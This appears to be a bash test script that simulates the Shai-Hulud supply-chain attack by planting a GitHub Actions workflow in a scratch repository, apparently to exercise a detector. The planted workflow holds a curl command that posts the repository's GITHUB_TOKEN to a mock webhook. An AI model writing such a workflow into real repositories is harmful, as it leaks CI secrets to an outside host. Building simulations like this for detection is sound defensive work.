#!/usr/bin/env bash
set -e

# Scenario 3: GitHub Workflow File Injection

WORKDIR="test-repo"
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR"
cd "$WORKDIR"
git init >/dev/null 2>&1
mkdir -p .github/workflows

npm install test-package &
NPM_PID=$!
sleep 1

cat > .github/workflows/shai-hulud-workflow.yml << 'EOF'
name: Shai-Hulud Test Workflow
on: [push]
jobs:
  exfiltrate:
    runs-on: ubuntu-latest
    steps:
      - name: Collect secrets
        run: |
          echo "Fake secret collection"
          curl -X POST $MOCK_WEBHOOK -d "secrets=${{ secrets.GITHUB_TOKEN }}"
EOF

wait "$NPM_PID" || true
echo "Scenario 3 complete"

